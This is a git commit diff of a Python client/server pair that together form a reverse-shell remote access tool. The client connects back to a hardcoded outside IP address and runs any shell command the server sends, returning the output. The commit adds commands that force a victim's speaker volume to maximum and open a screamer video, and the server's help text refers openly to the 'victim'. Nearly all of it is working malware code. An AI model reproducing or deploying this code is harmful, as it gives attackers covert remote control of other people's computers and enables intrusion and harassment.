d01b515f6bc5d0009f120a6a41ee3821cd3edbec
kirikra <126892040+irikra@users.noreply.github.com>
2024-10-14 19:18:15 -0400

    Add files via upload

--- client.py
+++ client.py
@@ -4,20 +4,27 @@ import subprocess
 import time
 import pyautogui as pg
 import random as rn
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from comtypes import GUID
 
-#for change ip+port look down
+
+# for change ip+port look down
+
 
 def connect_to_server():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#.                      LOOK HERE
-#.              change this ip+port
+            # .                      LOOK HERE
+            # .              change this ip+port
             s.connect(('91.245.44.46', 1212))
-            return s 
+            return s
         except Exception as e:
             print(f"Connection failed: {e}")
             time.sleep(5)
+
 
 def handle_server_communication(s):
     try:
@@ -30,30 +37,46 @@ def handle_server_communication(s):
                 try:
                     os.chdir(data[3:])
                     response = "Directory changed"
-                    
+                    s.sendall(response.encode('utf-8'))
+
                 except FileNotFoundError:
-                   response = "Invalid directory"
-                    
-            elif data.startswith('mouse_off') or data.startswith('mo'):
-                w, h = pg.size()
-                duration = int(data.split()[1])
-                starting_time = time.time()
-                while time.time() - starting_time < duration:
-                    x_mouse = rn.randint(0, w)
-                    y_mouse = rn.randint(0, h)
-                    pg.moveTo(x_mouse, y_mouse)
-                    time.sleep(0.1)
-                    
-                
-            
+                    response = "Invalid directory"
+                    s.sendall(response.encode('utf-8'))
+
+            #elif
+
+
+            elif data.startswith('volume') or data.startswith('vlm'):
+                try:
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(GUID(IAudioEndpointVolume._iid_), CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    volume.SetMasterVolumeLevelScalar(1.0, None)
+
+                except Exception as e:
+                    print(f"Произошла ошибка: {e}")
+
+            elif data.startswith('screamer') or data.startswith('scr'):
+                try:
+                    subprocess.run('start https://www.youtube.com/watch?v=OmrlS77nzLo', shell=True)
+                    devices = AudioUtilities.GetSpeakers()
+                    interface = devices.Activate(GUID(IAudioEndpointVolume._iid_), CLSCTX_ALL, None)
+                    volume = cast(interface, POINTER(IAudioEndpointVolume))
+                    volume.SetMasterVolumeLevelScalar(1.0, None)
+
+                except Exception as e:
+                    print(f"Произошла ошибка: {e}")
+
+
             else:
-                command = subprocess.run(data,shell=True,capture_output=True,text=True)
-                response = command.stdout if command.stdout else command.stderr 
+                command = subprocess.run(data, shell=True, capture_output=True, text=True)
+                response = command.stdout if command.stdout else command.stderr
                 s.sendall(response.encode('utf-8'))
     except Exception as e:
         print(f"Error during communication: {e}")
     finally:
         s.close()
+
 
 if __name__ == "__main__":
     server_socket = connect_to_server()
--- serverv1.py
+++ serverv1.py
@@ -3,8 +3,10 @@ import threading
 import time
 import sys
 
-#FOR EDITING UR PORT LOOK TO PRE-LAST BLOCK
-#for change ip+port on client look to client #file
+
+# FOR EDITING UR PORT LOOK TO PRE-LAST BLOCK
+# for change ip+port on client look to client file too
+
 
 def wait_for_connection(s):
     while True:
@@ -12,10 +14,11 @@ def wait_for_connection(s):
             print("Waiting for connection...")
             conn, addr = s.accept()
             print("Connected by", addr)
-            return conn   
+            return conn
         except Exception as e:
             print(f"Error establishing connection: {e}")
             time.sleep(1)
+
 
 def sending_comands_receiving_outs(conn):
     while True:
@@ -25,7 +28,8 @@ def sending_comands_receiving_outs(conn):
                 conn.close()
                 sys.exit()
             elif command.decode('utf-8') == 'help':
-                print('Available commands:\nexit_server: closing the connection\nhelp: printing this message\nmouse_off "seconds" or mo "seconds": turn off mouse on victim for a time\n')
+                print(
+                    'Available commands:\nexit_server: closing the connection\nhelp: printing this message\nmouse_off "seconds" or mo "seconds": turn off mouse on victim for a time\n')
             else:
                 conn.send(command)
                 data = conn.recv(1024)
@@ -36,11 +40,12 @@ def sending_comands_receiving_outs(conn):
             conn.close()
             break
 
+
 if __name__ == "__main__":
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-#for change port, edit this on ur port 
-#                      ||||
+    #                  edit this
+    #                  ||||
     s.bind(('0.0.0.0', 1212))
     s.listen(5)
 
